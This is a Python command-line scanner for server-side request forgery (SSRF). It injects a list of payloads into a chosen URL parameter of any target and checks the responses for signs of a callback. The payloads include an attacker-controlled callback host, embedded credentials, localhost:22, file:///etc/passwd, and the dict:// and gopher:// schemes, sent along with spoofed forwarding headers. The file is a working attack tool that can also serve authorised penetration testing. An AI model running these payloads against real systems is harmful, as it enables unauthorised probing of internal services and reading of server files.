import requests
import argparse
import urllib.parse
from concurrent.futures import ThreadPoolExecutor


def test_endpoint(url, parameter, callback_server):
    """Test a specific endpoint for SSRF vulnerability"""
    payloads = [
        callback_server, # Direct callback
        f"http://{callback_server}", # HTTP scheme
        f"https://{callback_server}", # HTTPS scheme
        f"http://{urllib.parse.quote(callback_server)}", # URL encoded
        f"http://user:pass@{callback_server}", # With credentials
        f"http://localhost:22/#{callback_server}", # Fragment identifier
        f"file:///etc/passwd#{callback_server}", # File scheme with fragment
        f"dict://{callback_server}", # Dict scheme
        f"gopher://{callback_server}:1234/_"
    ]
    
    results = []
    
    for payload in payloads:
        try:
            # Replace target parameter with our payload
            target_url= url.replace(f"{{{parameter}}}", payload)
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'X-Forwarded-For': callback_server, # Try header-based SSRF
                'Referer': f'http://{callback_server}'
            }
            
            print(f"[*] Testing {target_url}")
            r = requests.get(target_url, headers=headers, timeout=10, allow_redirects=False)
            # Look for indicators of successful SSRF
            if r.status_code >= 300 and r.status_code < 400:
                if callback_server in r.headers.get('Location', ''):
                    results.append(f"[VULN] Redirect to callback detected: {target_url} -> {r.headers['Location']}")

            # Check if response contains signs of successful callback
            content_sample = r.text[:200]
            if "Request received" in content_sample or callback_server in content_sample:
                results.append(f"[VULN] Response suggests callback was received: {target_url}")
                
        except Exception as e:
            if "Connection refused" in str(e):
                results.append(f"[POTENTIAL] Connection refused for {payload} - might indicate firewall blocking")
                
    return results


def main():
    parser = argparse.ArgumentParser(description='SSRF Vuln Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL with {parameter} placeholder')
    parser.add_argument('-p', '--parameter', required=True, help='Parameter to test for SSRF')
    parser.add_argument('-c', '--callback', required=True, help='Callback server to receive SSRF requests')
    args = parser.parse_args()

    print(f"[+] Starting SSRF scan against {args.url}")
    print(f"[+] Testing parameter: {args.parameter}")
    print(f"[+] Using callback server: {args.callback}")
    
    results = test_endpoint(args.url, args.parameter, args.callback)
    
    if results:
        print(f"\n[+] Potential SSRF vulnerabilities found:")
        for result in results:
            print(f"  {result}")
    else:
        print(f"\n[-] No obvious SSRF vulnerabilities detected with the provided payloads")
        
    print("\n[+] Scan complete. Consider monitoring your callback server for delayed responses")
    
if __name__ == "__main__":
    main()
